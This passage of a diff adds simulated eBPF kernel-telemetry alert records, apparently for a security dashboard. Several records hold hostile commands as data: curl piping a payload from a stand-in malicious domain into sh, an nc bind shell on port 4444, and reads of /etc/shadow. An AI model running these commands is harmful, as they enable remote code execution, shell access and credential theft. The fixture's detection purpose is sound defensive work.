+        "ppid": 637,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.0819054679093899",
+      "timestamp": "2026-09-23T04:23:23Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 10226, Parent PPID 828) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=828 pid=10226 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 10226,
+        "ppid": 828,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.4867078060067155",
+      "timestamp": "2026-09-23T04:23:22Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 31598, Parent PPID 467) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=467 pid=31598 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 31598,
+        "ppid": 467,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5163430659072237",
+      "timestamp": "2026-09-23T04:23:21Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 13348, Parent PPID 544) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=544 pid=13348 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 13348,
+        "ppid": 544,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7641025577317003",
+      "timestamp": "2026-09-23T04:23:20Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 24976, Parent PPID 159) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=159 pid=24976 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24976,
+        "ppid": 159,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.023979034012458822",
+      "timestamp": "2026-09-23T04:23:20Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 22291, Parent PPID 467) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=467 pid=22291 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22291,
+        "ppid": 467,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8289242860585783",
+      "timestamp": "2026-09-23T04:23:19Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 19613, Parent PPID 769) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=769 pid=19613 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19613,
+        "ppid": 769,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.423455626388459",
+      "timestamp": "2026-09-23T04:23:18Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 22361, Parent PPID 780) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=780 pid=22361 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22361,
+        "ppid": 780,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6807494285165465",
+      "timestamp": "2026-09-23T04:23:17Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 9544, Parent PPID 673) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=673 pid=9544 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 9544,
+        "ppid": 673,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.41534655277088106",
+      "timestamp": "2026-09-23T04:23:16Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 17084, Parent PPID 655) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=655 pid=17084 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 17084,
+        "ppid": 655,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.804517129790221",
+      "timestamp": "2026-09-23T04:23:16Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 22458, Parent PPID 693) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=693 pid=22458 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22458,
+        "ppid": 693,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8822977017480809",
+      "timestamp": "2026-09-23T04:23:15Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 17613, Parent PPID 78) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=78 pid=17613 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 17613,
+        "ppid": 78,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.9375478760202666",
+      "timestamp": "2026-09-23T04:23:14Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 12461, Parent PPID 29) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=29 pid=12461 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 12461,
+        "ppid": 29,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.48535315870373974",
+      "timestamp": "2026-09-23T04:23:13Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 31330, Parent PPID 100) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=100 pid=31330 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 31330,
+        "ppid": 100,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.28418689400823094",
+      "timestamp": "2026-09-23T04:23:12Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 31316, Parent PPID 180) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=180 pid=31316 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 31316,
+        "ppid": 180,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7348082637831782",
+      "timestamp": "2026-09-23T04:23:12Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 5063, Parent PPID 654) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=654 pid=5063 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 5063,
+        "ppid": 654,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.2539518863246718",
+      "timestamp": "2026-09-23T04:23:11Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 24160, Parent PPID 291) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=291 pid=24160 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24160,
+        "ppid": 291,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.8735350255948428",
+      "timestamp": "2026-09-23T04:23:10Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 2107, Parent PPID 194) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=194 pid=2107 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 2107,
+        "ppid": 194,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5131473758082207",
+      "timestamp": "2026-09-23T04:23:09Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 4736, Parent PPID 656) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=656 pid=4736 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 4736,
+        "ppid": 656,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.16918170129239773",
+      "timestamp": "2026-09-23T04:23:08Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: epoll_wait on systemd",
+      "severity": "low",
+      "details": "Process 'systemd' (PID 20450, Parent PPID 498) executed system call 'epoll_wait' with args 'maxevents: 32'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=epoll_wait ppid=498 pid=20450 comm=systemd args=maxevents: 32 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 20450,
+        "ppid": 498,
+        "comm": "systemd",
+        "syscall": "epoll_wait",
+        "args": "maxevents: 32",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.9722526226801969",
+      "timestamp": "2026-09-23T04:23:08Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 4215, Parent PPID 921) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=921 pid=4215 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 4215,
+        "ppid": 921,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.1356066629323207",
+      "timestamp": "2026-09-23T04:23:07Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 3263, Parent PPID 64) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=64 pid=3263 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 3263,
+        "ppid": 64,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.015758507068973082",
+      "timestamp": "2026-09-23T04:23:06Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 11594, Parent PPID 277) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=277 pid=11594 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 11594,
+        "ppid": 277,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7793574310268033",
+      "timestamp": "2026-09-23T04:23:05Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 2407, Parent PPID 261) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=261 pid=2407 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 2407,
+        "ppid": 261,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8315926303454774",
+      "timestamp": "2026-09-23T04:23:04Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 32236, Parent PPID 553) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=553 pid=32236 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 32236,
+        "ppid": 553,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.2063905678953064",
+      "timestamp": "2026-09-23T04:23:04Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: accept4 on nginx",
+      "severity": "low",
+      "details": "Process 'nginx' (PID 28552, Parent PPID 831) executed system call 'accept4' with args 'client: 192.168.1.55:53299'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=accept4 ppid=831 pid=28552 comm=nginx args=client: 192.168.1.55:53299 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 28552,
+        "ppid": 831,
+        "comm": "nginx",
+        "syscall": "accept4",
+        "args": "client: 192.168.1.55:53299",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.7930955452221263",
+      "timestamp": "2026-09-23T04:23:03Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 2530, Parent PPID 619) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=619 pid=2530 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 2530,
+        "ppid": 619,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.7806294354237557",
+      "timestamp": "2026-09-23T04:23:02Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 23159, Parent PPID 208) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=208 pid=23159 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 23159,
+        "ppid": 208,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5653504099171044",
+      "timestamp": "2026-09-23T04:23:01Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 14467, Parent PPID 913) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=913 pid=14467 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 14467,
+        "ppid": 913,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7381859295082186",
+      "timestamp": "2026-09-23T04:23:00Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 6404, Parent PPID 855) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=855 pid=6404 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6404,
+        "ppid": 855,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.18765137615410876",
+      "timestamp": "2026-09-23T04:23:00Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 28238, Parent PPID 877) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=877 pid=28238 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 28238,
+        "ppid": 877,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5950041249144075",
+      "timestamp": "2026-09-23T04:22:59Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 15551, Parent PPID 224) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=224 pid=15551 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 15551,
+        "ppid": 224,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.0681741790768019",
+      "timestamp": "2026-09-23T04:22:58Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 19740, Parent PPID 38) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=38 pid=19740 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19740,
+        "ppid": 38,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.12327875875402916",
+      "timestamp": "2026-09-23T04:22:57Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 18312, Parent PPID 603) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=603 pid=18312 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 18312,
+        "ppid": 603,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7373255607404371",
+      "timestamp": "2026-09-23T04:22:56Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 11585, Parent PPID 815) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=815 pid=11585 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 11585,
+        "ppid": 815,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.637323331309829",
+      "timestamp": "2026-09-23T04:22:56Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 32233, Parent PPID 805) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=805 pid=32233 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 32233,
+        "ppid": 805,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.11757392913847786",
+      "timestamp": "2026-09-23T04:22:55Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 30562, Parent PPID 973) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=973 pid=30562 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30562,
+        "ppid": 973,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5963402623078683",
+      "timestamp": "2026-09-23T04:22:54Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 29104, Parent PPID 471) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=471 pid=29104 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 29104,
+        "ppid": 471,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.10717572960708066",
+      "timestamp": "2026-09-23T04:22:53Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 20281, Parent PPID 537) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=537 pid=20281 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 20281,
+        "ppid": 537,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.15813568316047333",
+      "timestamp": "2026-09-23T04:22:52Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 20101, Parent PPID 680) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=680 pid=20101 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 20101,
+        "ppid": 680,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.3575954051698691",
+      "timestamp": "2026-09-23T04:22:52Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 12636, Parent PPID 39) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=39 pid=12636 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
